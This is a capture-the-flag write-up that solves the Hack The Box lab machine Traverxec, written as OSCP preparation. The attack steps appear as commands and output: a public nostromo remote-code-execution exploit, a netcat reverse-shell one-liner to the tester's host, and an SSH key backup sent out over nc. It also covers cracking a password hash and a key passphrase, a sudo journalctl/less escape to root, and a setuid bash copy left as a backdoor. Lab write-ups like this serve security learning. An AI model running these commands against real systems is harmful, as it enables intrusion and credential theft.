---
title: "Hack The Box - Traverxec"
description: "This is a write up about the hackthebox machine Traverxec"
author: "Gian Rathgeb"
date: 2022-05-25T12:48:30+2:00
categories:
  - HackTheBox
  - WriteUp
  - Linux
tags:
  - OSCP Preparation
  - SSH
  - Nostoromo
  - Less
  - Nmap
---
# Introduction

---

Traverxec is an easy machine rated 4.3, which is fine for an easy machine. The community thinks that this is more like a medium box. Without a lot of talking, let’s start the enumeration.

# Enumeration

---

I will use nmap to scan the machine.

## Nmap Scan

---

Here is the result of a simple scan of all ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ sudo nmap -sS -p- -v traverxec.htb                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 13:07 CEST
Initiating Ping Scan at 13:07
Scanning traverxec.htb (10.10.10.165) [4 ports]
Completed Ping Scan at 13:07, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:07
Scanning traverxec.htb (10.10.10.165) [65535 ports]
Discovered open port 22/tcp on 10.10.10.165
Discovered open port 80/tcp on 10.10.10.165
SYN Stealth Scan Timing: About 19.52% done; ETC: 13:10 (0:02:08 remaining)
SYN Stealth Scan Timing: About 47.60% done; ETC: 13:09 (0:01:07 remaining)
Completed SYN Stealth Scan at 13:09, 105.39s elapsed (65535 total ports)
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.030s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 105.64 seconds
           Raw packets sent: 131153 (5.771MB) | Rcvd: 84 (3.680KB)
```

I also do a deep scan on the open ports found (with `-A` flag):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ sudo nmap -A -p 22,80 traverxec.htb                       
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 13:11 CEST
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), 
Crestron XPanel control system (90%), Linux 3.18 (89%), Linux 3.16 (89%), 
ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), 
HP P2000 G3 NAS device (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   61.93 ms 10.10.16.1
2   62.01 ms traverxec.htb (10.10.10.165)

Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
```

## Service Enumeration

---

I only need to enumerate the web server (SSH version is not vulnerable). Nmap found which service is running: nostromo 1.9.6. I search for an exploit before scanning the webserver for hidden files:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ searchsploit nostromo 1.9.6   
------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution            | multiple/remote/47837.py
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is one available. Let's try to exploit the system.

# Exploitation

---

First, I copy the exploit:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ searchsploit nostromo 1.9.6   
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                              | multiple/remote/47837.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                      
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ searchsploit -m 47837.py                     
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/traverxec/47837.py  
                                                                                                                                                                                                                                             
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ ls 
47837.py
```

I had to comment one line out, you will find the correct line by yourself. Now, test the script:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ python 47837.py traverxec.htb 80 id

                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    

HTTP/1.1 200 OK
Date: Sun, 12 Sep 2021 12:32:42 GMT
Server: nostromo 1.9.6
Connection: close

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The exploit works, I can now get a reverse shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ python 47837.py traverxec.htb 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 4444 >/tmp/f"
```

I look at the netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.165] 43628
/bin/sh: 0: can't access tty; job control turned off
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export TERM=xterm
www-data@traverxec:/usr/bin$ 
zsh: suspended nc -lvnp 4444
                 
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ stty raw -echo; fg
[1]  + continued nc -lvnp 4444
www-data@traverxec:/usr/bin$
```

I'm not able to read the user flag, so I need to privesc first.

# Privesc

---

## www-data → david

---

I used LinPEAS to find useful informations. I found this config file with credentials in it:

```bash
www-data@traverxec:/usr/bin$ cd /var/nostromo/conf
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

I can crack this hash using hashcat and mode 500:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
...[snip]...
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me    
...[snip]...
```

I cannot use the password at the time, so I enumerate more .I checked the config file and found these lines:

```
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

This is the configuration for the home dirs, with the username david I can try to access his home dir page on the webserver ([`http://traverxec.htb/~david/`](http://traverxec.htb/~david/)):

![Untitled](/assets/images/2022-05-15-traverxec/Untitled.png)

This does not help me out. I scanned the host for hidden directories, but found nothing. So I came up with the idea of searching the location of the page in the shell I got:

```bash
www-data@traverxec:/home$ cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area/
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
```

I found the location and I have access to it. Nevertheless I also found a backup of an SSH. I can transfer it using netcat:

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | nc 10.10.16.6 5555
```

In my netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ nc -lvnp 5555 >  backup-identity-files.tgz
listening on [any] 5555 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.165] 56908
^C
                                                
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ ls                                          
47837.py  backup-identity-files.tgz  hash.txt
```

Now, I can extract it:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/traverxec]
└─$ tar -zxvf backup-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

There is an SSH key, it's time to crack the password (I use john for this):

```bash
┌──(user㉿KaliVM)-[/hackthebox/…/traverxec/home/david/.ssh]
└─$ ls
authorized_keys  id_rsa  id_rsa.pub
                                                  
┌──(user㉿KaliVM)-[/hackthebox/…/traverxec/home/david/.ssh]
└─$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
                                                        
┌──(user㉿KaliVM)-[/hackthebox/…/traverxec/home/david/.ssh]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:04 DONE (2021-09-12 14:54) 0.2016g/s 2891Kp/s 2891Kc/s 2891KC/s 
Session completed
                    
┌──(user㉿KaliVM)-[/hackthebox/…/traverxec/home/david/.ssh]
└─$ john --show id_rsa_hash.txt                                     
id_rsa:hunter

1 password hash cracked, 0 left
```

The password was cracked pretty fast, let's try to login with SSH:

```bash
┌──(user㉿KaliVM)-[/hackthebox/…/traverxec/home/david/.ssh]
└─$ ssh david@traverxec.htb -i id_rsa 
The authenticity of host 'traverxec.htb (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$whoami
david
```

### User Flag

---

With the active SSH session as user david, I can get the user flag:

```bash
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7d**************************2f3d
```

## david → root

---

In the bin directory there is a script:

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The script opens journalctl to the unostromo service as root. I can maybe insert code into the journalctl file which will then gets executed as root. Normally you could just use `sudo journalctl !/bin/sh` to start a root shell. 

I found a trick for this in a write up. If the terminal window is too small, the output will be open in less, which will still be opened as root.

So shrunk the window and ran the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`:

![Untitled](/assets/images/2022-05-15-traverxec/Untitled1.png)

You can now escape less using `!/bin/bash`:

```bash
~
!/bin/bash
root@traverxec:/home/david/bin# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david/bin# cp /bin/bash /tmp/rootbash
root@traverxec:/home/david/bin# chmod +s /tmp/rootbash
```

There is the root shell. Note: I just created rootbash in case the shell crashes.

### Root Flag

---

It's time to get the root flag:

```bash
root@traverxec:/home/david/bin# cat /root/root.txt
9a**************************d906
```

# Conclusions

---

The box was fun but the trick were you have to shrink the windows is too much. I liked everything except this. The box is good and I learned some new stuff but that trick made everything worse.